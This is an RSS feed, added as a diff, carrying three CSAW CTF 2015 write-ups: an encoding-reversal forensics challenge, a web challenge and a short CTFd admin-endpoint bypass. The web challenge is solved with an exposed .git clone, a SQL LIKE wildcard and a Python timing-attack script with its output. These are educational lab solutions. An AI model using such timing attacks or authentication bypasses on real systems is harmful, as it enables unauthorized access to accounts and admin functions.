@@ -1,0 +1,427 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ctf on Jordan Wright</title>
+    <link>http://jordan-wright.com/blog/tags/ctf/</link>
+    <description>Recent content in Ctf on Jordan Wright</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 22 Sep 2015 19:05:18 +0000</lastBuildDate>
+    <atom:link href="http://jordan-wright.com/blog/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>CSAW CTF 2015 - Forensics 100 Transfer Writeup</title>
+      <link>http://jordan-wright.com/blog/2015/09/22/csaw-ctf-2015-forensics-100-transfer-writeup/</link>
+      <pubDate>Tue, 22 Sep 2015 19:05:18 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/09/22/csaw-ctf-2015-forensics-100-transfer-writeup/</guid>
+      <description>&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/csaw_100.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;p&gt;This challenge starts off with the following hint:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;I was sniffing some web traffic for a while, I think i finally got something interesting. Help me find flag through all these packets.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This challenge started off with a pcap. Let&amp;rsquo;s take the cheap way out and do a basic Wireshark filter for &lt;code&gt;frame contains flag&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/csaw2015/frame_contains.png&#34;&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome - looks like we found a packet. Following the TCP stream reveals a Python script (formatted - you&amp;rsquo;re welcome) and what appears to be the output of the script:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import string
+import random
+from base64 import b64encode, b64decode
+
+FLAG = &#39;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}&#39;
+
+enc_ciphers = [&#39;rot13&#39;, &#39;b64e&#39;, &#39;caesar&#39;]
+# dec_ciphers = [&#39;rot13&#39;, &#39;b64d&#39;, &#39;caesard&#39;]
+
+def rot13(s):
+    _rot13 = string.maketrans( 
+    &amp;quot;ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz&amp;quot;, 
+    &amp;quot;NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm&amp;quot;)
+    return string.translate(s, _rot13)
+
+def b64e(s):
+    return b64encode(s)
+
+def caesar(plaintext, shift=3):
+    alphabet = string.ascii_lowercase
+    shifted_alphabet = alphabet[shift:] + alphabet[:shift]
+    table = string.maketrans(alphabet, shifted_alphabet)
+    return plaintext.translate(table)
+
+def encode(pt, cnt=50):
+    tmp = &#39;2{}&#39;.format(b64encode(pt))
+    for cnt in xrange(cnt):
+        c = random.choice(enc_ciphers)
+        i = enc_ciphers.index(c) + 1
+        _tmp = globals()[c](tmp)
+        tmp = &#39;{}{}&#39;.format(i, _tmp)
+
+    return tmp
+
+if __name__ == &#39;__main__&#39;:
+    print encode(FLAG, cnt=?)
+
+2Mk16Sk5iakYxVFZoS1RsWnZXbFZaYjFaa1prWm&amp;lt;snip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We see that there are three different encryption/encoding routines available - base64 encoding, a caesar cipher, and a rot13 function. Let&amp;rsquo;s dissect the &lt;code&gt;encode&lt;/code&gt; function to see if we can figure out what&amp;rsquo;s going on with the input.&lt;/p&gt;
+
+&lt;p&gt;It looks like we start off by base64 encoding the input and prepending &amp;ldquo;2&amp;rdquo; to it. Then, as many times as specified (the default is 50), we choose a random function and run it on the current input.&lt;/p&gt;
+
+&lt;p&gt;The important line in our reversal is &lt;code&gt;tmp = &#39;{}{}&#39;.format(i, _tmp)&lt;/code&gt;. This line prepends the &lt;em&gt;output&lt;/em&gt; of the function chosen with the function&amp;rsquo;s &lt;em&gt;index in enc_ciphers + 1&lt;/em&gt;. This makes sense, as the index + 1 of the base64 encode function is 2, and that&amp;rsquo;s exactly what we prepend to the initial input before base64 encoding it.&lt;/p&gt;
+
+&lt;p&gt;So, in a nutshell here are the corresponding keys:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;1 - rot13&lt;/li&gt;
+&lt;li&gt;2 - base64 encode&lt;/li&gt;
+&lt;li&gt;3 - caesar cipher&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;All we have to do to get the original flag is to reverse this process. We have to start by creating the inverse of our functions. Rot13 is its own inverse, and for Caesar cipher we can just change &lt;code&gt;shift=3&lt;/code&gt; to &lt;code&gt;shift=-3&lt;/code&gt;. Then, we only have to add the following base64 decode function:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def b64d(s):
+    return b64decode(s)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finally, we just need to put the pieces together to do the reversing. I used the following &lt;code&gt;decode&lt;/code&gt; and &lt;code&gt;main&lt;/code&gt; functions:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def decode(pt):
+	while &amp;quot;flag&amp;quot; not in pt:
+		i = int(pt[0])
+		raw = pt[1:]
+		print &amp;quot;Running function &amp;quot; + dec_ciphers[i-1]
+		_pt = globals()[dec_ciphers[i-1]](raw)
+		pt = _pt
+	print pt
+
+if __name__ == &#39;__main__&#39;:
+	with open(&#39;csaw_data.txt&#39;, &#39;r&#39;) as raw:
+		print decode(raw.read().strip())
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This gives us the following output:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Running function b64d
+Running function b64d
+Running function caesard
+Running function b64d
+Running function b64d
+Running function b64d
+Running function b64d
+Running function rot13
+Running function b64d
+Running function caesard
+Running function caesard
+Running function caesard
+Running function rot13
+Running function rot13
+Running function rot13
+Running function b64d
+Running function rot13
+Running function rot13
+Running function rot13
+Running function b64d
+Running function caesard
+Running function caesard
+Running function rot13
+Running function b64d
+Running function caesard
+Running function caesard
+Running function caesard
+Running function b64d
+Running function b64d
+Running function b64d
+Running function b64d
+Running function b64d
+Running function caesard
+Running function b64d
+Running function rot13
+Running function rot13
+Running function caesard
+Running function caesard
+Running function caesard
+Running function caesard
+Running function caesard
+Running function caesard
+Running function caesard
+Running function caesard
+Running function b64d
+Running function b64d
+Running function caesard
+Running function caesard
+Running function caesard
+Running function b64d
+Running function rot13
+Running function caesard
+Running function b64d
+Running function caesard
+Running function b64d
+Running function rot13
+Running function caesard
+Running function rot13
+Running function caesard
+Running function caesard
+Running function b64d
+flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There&amp;rsquo;s the flag! &lt;code&gt;flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CSAW CTF 2015 - Web 200 Writeup</title>
+      <link>http://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/</link>
+      <pubDate>Mon, 21 Sep 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/</guid>
+      <description>&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/csaw_200.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;p&gt;Web 200 was a fun challenge that required us to chain together a few basic concepts to get the flag. When navigating to the URL given, we see that the challenge is based on a &amp;ldquo;Lawn Care Simulator 2015&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/csaw2015/lawn_care.png&#34;&gt;&lt;/p&gt;
+
+&lt;p&gt;We can immediately see there&amp;rsquo;s a sign in form, which might prove useful later. But before we get too far into that, let&amp;rsquo;s view the page source. Opening up the source, we see the following javascript snippet:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function init(){
+            document.getElementById(&#39;login_form&#39;).onsubmit = function() {
+                var pass_field = document.getElementById(&#39;password&#39;); 
+                pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
+        };
+        $.ajax(&#39;.git/refs/heads/master&#39;).done(function(version){$(&#39;#version&#39;).html(&#39;Version: &#39; +  version.substring (0,6))});
+        initGrass();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You&amp;rsquo;ll notice that there&amp;rsquo;s an ajax call being made to a &lt;code&gt;.git&lt;/code&gt; directory. If this is a full Git repo, we should be able to clone it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jordan@temp:~$ git clone http://54.175.3.248:8089/.git web200
+jordan@temp:~$ ls web200
+___HINT___  jobs.html  premium.php  validate_pass.php
+index.html  js         sign_up.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;Nice!&lt;/em&gt; Now we can dive into the PHP. The &lt;code&gt;__HINT__&lt;/code&gt; didn&amp;rsquo;t prove to useful to me, but maybe I just didn&amp;rsquo;t &lt;em&gt;get&lt;/em&gt; it. Let&amp;rsquo;s get started by looking at the relevant parts of &lt;code&gt;premium.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    require_once &#39;validate_pass.php&#39;;
+    require_once &#39;flag.php&#39;;
+    if (isset($_POST[&#39;password&#39;]) &amp;amp;&amp;amp; isset($_POST[&#39;username&#39;])) {
+        $auth = validate($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]);
+        if ($auth){
+            echo &amp;quot;&amp;lt;h1&amp;gt;&amp;quot; . $flag . &amp;quot;&amp;lt;/h1&amp;gt;&amp;quot;;
+        }
+        else {
+            echo &amp;quot;&amp;lt;h1&amp;gt;Not Authorized&amp;lt;/h1&amp;gt;&amp;quot;;
+        }
+    }
+    else {
+        echo &amp;quot;&amp;lt;h1&amp;gt;You must supply a username and password&amp;lt;/h1&amp;gt;&amp;quot;;
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It looks like our flag is found in &lt;code&gt;flag.php&lt;/code&gt;. Unfortunately, we don&amp;rsquo;t have that file, but it looks like &lt;code&gt;$flag&lt;/code&gt; is printed if we authenticate correctly.&lt;/p&gt;
+
+&lt;p&gt;The authentication is handled by the &lt;code&gt;validate(username, password)&lt;/code&gt; function in &lt;code&gt;validate_pass.php&lt;/code&gt;. Let&amp;rsquo;s see what it looks like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    &amp;lt;snip&amp;gt;
+    $user = mysql_real_escape_string($user);
+    $query = &amp;quot;SELECT hash FROM users WHERE username=&#39;$user&#39;;&amp;quot;;
+    $result = mysql_query($query) or die(&#39;Query failed: &#39; . mysql_error());
+    $line = mysql_fetch_row($result, MYSQL_ASSOC);
+    $hash = $line[&#39;hash&#39;];
+
+    if (strlen($pass) != strlen($hash))
+        return False;
+
+    $index = 0;
+    while($hash[$index]){
+        if ($pass[$index] != $hash[$index])
+            return false;
+        # Protect against brute force attacks
+        usleep(300000);
+        $index+=1;
+    }
+    return true;
+    &amp;lt;snip&amp;gt;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This function gets the password hash from the given username and then compares it character by character with the hash provided. Keep in mind, our password was hashed in Javascript in the snippet shown above.&lt;/p&gt;
+
+&lt;p&gt;We&amp;rsquo;ll get back to the password comparison later. First, how do we get the username? We have one more file, &lt;code&gt;sign_up.php&lt;/code&gt; that might help. Let&amp;rsquo;s take a look:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    &amp;lt;snip&amp;gt;
+    $user = mysql_real_escape_string($_POST[&#39;username&#39;]);
+    // check to see if the username is available
+    $query = &amp;quot;SELECT username FROM users WHERE username LIKE &#39;$user&#39;;&amp;quot;;
+    $result = mysql_query($query) or die(&#39;Query failed: &#39; . mysql_error());
+    $line = mysql_fetch_row($result, MYSQL_ASSOC);
+    if ($line == NULL){
+        // Signing up for premium is still in development
+        echo &#39;&amp;lt;h2 style=&amp;quot;margin: 60px;&amp;quot;&amp;gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&amp;lt;/h2&amp;gt;&#39;;
+    }
+    else {
+        echo &#39;&amp;lt;h2 style=&amp;quot;margin: 60px;&amp;quot;&amp;gt;Username: &#39; . $line[&#39;username&#39;] . &amp;quot; is not available&amp;lt;/h2&amp;gt;&amp;quot;;
+    }
+    &amp;lt;snip&amp;gt;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This function tries to look up the username given and, if it exists, will tell us the username isn&amp;rsquo;t available. We could try guessing (I did), but that doesn&amp;rsquo;t help. Let&amp;rsquo;s look more closely at the code.&lt;/p&gt;
+
+&lt;p&gt;The SQL statement is done via a &lt;code&gt;LIKE&lt;/code&gt; condition. This allows us to use the &lt;code&gt;%&lt;/code&gt; character as a wildcard. So, by trying the username &lt;code&gt;%&lt;/code&gt;, we should get the username from the database.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/csaw2015/username.png&#34;&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome - our username is &lt;code&gt;~~FLAG~~&lt;/code&gt;. Now we need to find the password.&lt;/p&gt;
+
+&lt;p&gt;Going back to the code given in &lt;code&gt;validate_pass.php&lt;/code&gt;, we see the following comparison&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    while($hash[$index]){
+        if ($pass[$index] != $hash[$index])
+            return false;
+        # Protect against brute force attacks
+        usleep(300000);
+        $index+=1;
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This snippet checks our hash against the one pulled from the databse. It does this by checking each character. If the character is wrong, it returns false immediately. However, look at what happens if the character is right. It does a &lt;code&gt;usleep(300000)&lt;/code&gt;, which is .3 seconds. This means that, if we check every character, one will take longer. This is a &lt;strong&gt;timing attack&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;I wrote a quick script to exploit this. Here is the final (not very good) code I wound up using:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;import time
+import requests
+
+data = {
+	&amp;quot;username&amp;quot; : &amp;quot;~~FLAG~~&amp;quot;,
+	&amp;quot;password&amp;quot; : &amp;quot;&amp;quot;
+}
+
+url = &amp;quot;http://54.175.3.248:8089/premium.php&amp;quot;
+
+password = [&#39;a&#39;]*32 
+
+def send_request(password):
+	data[&amp;quot;password&amp;quot;] = password
+	start = time.time()
+	requests.post(url, data=data)
+	end = time.time()
+	return end - start	
+
+hex = &amp;quot;0123456789abcdef&amp;quot;
+
+for i in range(32):
+	max_time = 0
+	char = &amp;quot;&amp;quot;
+	index = 0
+	for j in hex:
+		temp_pass = password
+		temp_pass[i] = j
+		request_time = send_request(&amp;quot;&amp;quot;.join(temp_pass))
+		if request_time &amp;gt;= max_time:
+			index = i
+			max_time = request_time
+			char = j
+	password[index] = char	
+	print &amp;quot;&amp;quot;.join(password)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This basically brute forces the password by checking each valid hex character to see which takes the longest amount of time. It does this for each character in the hash. Running the code produces the following output:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+66aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+667aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+667eaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+667e2aaaaaaaaaaaaaaaaaaaaaaaaaaa
+667e21aaaaaaaaaaaaaaaaaaaaaaaaaa
+667e217aaaaaaaaaaaaaaaaaaaaaaaaa
+667e2176aaaaaaaaaaaaaaaaaaaaaaaa
+667e21766aaaaaaaaaaaaaaaaaaaaaaa
+667e217666aaaaaaaaaaaaaaaaaaaaaa
+667e217666aaaaaaaaaaaaaaaaaaaaaa
+667e217666a1aaaaaaaaaaaaaaaaaaaa
+667e217666a13aaaaaaaaaaaaaaaaaaa
+667e217666a13daaaaaaaaaaaaaaaaaa
+667e217666a13d3aaaaaaaaaaaaaaaaa
+667e217666a13d39aaaaaaaaaaaaaaaa
+667e217666a13d39aaaaaaaaaaaaaaaa
+667e217666a13d39a0aaaaaaaaaaaaaa
+667e217666a13d39a02aaaaaaaaaaaaa
+667e217666a13d39a023aaaaaaaaaaaa
+667e217666a13d39a0239aaaaaaaaaaa
+667e217666a13d39a02399aaaaaaaaaa
+667e217666a13d39a023995aaaaaaaaa
+667e217666a13d39a0239951aaaaaaaa
+667e217666a13d39a0239951eaaaaaaa
+667e217666a13d39a0239951efaaaaaa
+667e217666a13d39a0239951efeaaaaa
+667e217666a13d39a0239951efe2aaaa
+667e217666a13d39a0239951efe2daaa
+667e217666a13d39a0239951efe2deaa
+667e217666a13d39a0239951efe2de4a
+667e217666a13d39a0239951efe2de48
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, all that&amp;rsquo;s left is to login and get the flag. To bypass the javascript hashing, I just used the dev console (you could also do this in Python!):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$.post(&#39;premium.php&#39;, {&amp;quot;username&amp;quot;: &amp;quot;~~FLAG~~&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;667e217666a13d39a0239951efe2de48&amp;quot;}).success(function(data){console.log(data)})
+&amp;lt;head&amp;gt;
+    &amp;lt;title&amp;gt;Lawn Care Simulator 2015&amp;lt;/title&amp;gt;
+    &amp;lt;script src=&amp;quot;//code.jquery.com/jquery-1.11.3.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+    &amp;lt;script src=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 
+    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css&amp;quot;&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;flag{gr0wth__h4ck!nG!1!1!&amp;lt;/h1&amp;gt;&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And there we have the flag: &lt;code&gt;flag{gr0wth__h4ck!nG!1!1!}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CSAW CTF 2015 - Web 600 Writeup</title>
+      <link>http://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-600-writeup/</link>
+      <pubDate>Sun, 20 Sep 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-600-writeup/</guid>
+      <description>&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/csaw_600.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;p&gt;This one was surprisingly easy if you knew where to look.&lt;/p&gt;
+
+&lt;p&gt;For this challenge, we were presented with a hint that indicated there was a vulnerability in the code used to run the CSAW CTF. I remember seeing a while back that the platform was &lt;a href=&#34;https://github.com/isislab/CTFd&#34;&gt;open-sourced&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;When looking for bugs in open-source projects, both Issues and Commits are good places to start out. In this case, we see &lt;a href=&#34;https://github.com/isislab/CTFd/commit/9578355143d7af675fc4776b0f2de802be91e261&#34;&gt;a commit&lt;/a&gt; recently made with the message &amp;ldquo;Fix authentication for certain admin actions&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code&gt;/admin/chal/new&lt;/code&gt; function would be pretty dangerous since it might allow us to upload a file. Let&amp;rsquo;s see what happens if we make a POST to that endpoint:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;jordan@temp:~$ curl https://ctf.isis.poly.edu/admin/chal/new -XPOST
+flag{at_least_it_isnt_php}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Easy enough.&lt;/p&gt;
+
+&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
